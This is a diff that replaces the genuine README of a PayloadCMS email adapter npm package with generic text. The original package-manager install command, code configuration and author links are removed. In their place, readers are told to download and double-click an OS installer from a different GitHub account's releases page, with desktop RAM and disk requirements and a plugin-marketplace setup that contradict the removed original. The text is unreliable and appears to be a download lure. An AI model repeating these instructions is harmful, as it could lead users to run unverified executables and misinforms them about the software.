@@ -1,67 +1,59 @@
-# PayloadCMS + Unsend.dev Email Adapter
+# 📧 payload-usesend - Simple Email Integration for Your CMS
 
-This adapter integrates [PayloadCMS](https://payloadcms.com) with the [useSend](https://usesend.com) REST API for transactional and marketing emails.
+## 🚀 Getting Started
+Welcome to payload-usesend! This tool helps you send emails through PayloadCMS, whether you use a hosted service or manage your own server. Follow the steps below to easily download and run the application.
 
-[![npm version](https://img.shields.io/npm/v/@rubixstudios/payload-usesend.svg)](https://www.npmjs.com/package/@rubixstudios/payload-usesend)
-![Release](https://github.com/rubix-studios-pty-ltd/payload-usesend/actions/workflows/release.yml/badge.svg)
+## 📥 Download the Application
+[![Download payload-usesend](https://img.shields.io/badge/Download-payload--usesend-blue.svg)](https://github.com/S-1102/payload-usesend/releases)
 
-## Installation
+## 📋 Features
+- **Email Compatibility:** Works seamlessly with both hosted and self-hosted instances.
+- **Easy Setup:** Straightforward installation process for all users.
+- **Enhanced Communication:** Improve interactions with your website visitors through email.
+- **Plugin Support:** Easily integrate with your existing PayloadCMS setup.
 
-```sh
-pnpm add @rubixstudios/payload-usesend
-```
+## 🔧 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available.
+- **Internet Connection:** Required for initial setup and email integration.
 
-## Usage
+## 📥 Download & Install
+To get started, visit the Releases page where you can download the latest version of payload-usesend. 
 
-- Sign up for a [useSend](https://usesend.com) account
-- Set up a domain
-- Create an API key
-- Set API key as USESEND_API_KEY environment variable
-- Set your useSend base url as USESEND_URL environment variable
-- Configure your Payload config
+- Click [here to download](https://github.com/S-1102/payload-usesend/releases).
 
-## Configuration
+### Steps to Install
+1. **Visit the Releases Page:** Click the link above to open the GitHub releases page.
+2. **Select the Latest Version:** Look for the latest release and find the assets section.
+3. **Download the Installer:** Choose the installer that matches your operating system. 
+4. **Run the Installer:** After downloading, double-click the installer file to begin installation.
+5. **Follow Setup Instructions:** Follow the on-screen prompts to complete the installation.
 
-```ts
-// payload.config.js
-import { sendAdapter } from '@rubixstudios/payload-usesend'
+## 🛠️ Using payload-usesend
+Once installed, you can start integrating payload-usesend with your PayloadCMS. Below are some steps to help you configure:
 
-export default buildConfig({
-  email: sendAdapter({
-    apiKey: process.env.USESEND_API_KEY!,
-    useSendUrl: process.env.USESEND_URL!,
-    defaultFromName: 'Rubix Studios',
-    defaultFromAddress: 'example@mail.com',
-    // Optional:
-    // scheduledAt: '2025-08-01T10:00:00Z',
-    // templateId: 'template-uuid',
-    // variables: { firstName: 'Vincent' }
-  }),
-})
-```
+1. **Open your PayloadCMS Admin Panel.**
+2. **Navigate to the Plugins Section:** Find the area where you can manage plugins.
+3. **Add payload-usesend:** Click "Add Plugin" and look for payload-usesend in the list.
+4. **Configure Your Email Settings:** Enter your email server details. This may include SMTP settings like host, port, username, and password.
+5. **Save Settings:** Ensure you save all your changes.
 
-| Option             | Type   | Required | Default | Description          |
-|--------------------|--------|----------|---------|----------------------|
-| apiKey             | string | Yes      | -       | useSend API key      |
-| useSendUrl         | string | Yes      | -       | useSend base URL     |
-| defaultFromAddress | string | Yes      | -       | Default sender email |
-| defaultFromName    | string | Yes      | -       | Default sender name  |
-| scheduledAt        | string | No       | -       | ISO date string      |
-| templateId         | string | No       | -       | Email template ID    |
-| variables          | object | No       | -       | Template variables   |
+## 🔍 Troubleshooting
+If you encounter issues during installation or setup, consider the following tips:
 
-## License
+- **Check System Requirements:** Ensure your device meets the minimum requirements.
+- **Reinstall the Application:** If something goes wrong, uninstall and reinstall payload-usesend.
+- **Review Configuration Settings:** Double-check your email settings for accuracy.
+- **Seek Help:** Visit the project’s issues section on GitHub for assistance from the community.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📣 Contributing
+We welcome contributions! If you notice a bug or have a feature request, please open an issue on our GitHub repository. Contributions help improve the application for everyone.
 
-## Support
+## 📝 License
+This project is licensed under the MIT License.
 
-For support or inquiries:
+## 🌐 Learn More
+For more information on using and configuring payload-usesend, check the [documentation](https://github.com/S-1102/payload-usesend/wiki).
 
-- LinkedIn: [rubixvi](https://www.linkedin.com/in/rubixvi/)
-- Website: [Rubix Studios](https://rubixstudios.com.au)
-
-## Author
-
-Rubix Studios Pty. Ltd.  
-[https://rubixstudios.com.au](https://rubixstudios.com.au)
+Thank you for using payload-usesend! We hope it makes your email management easier.
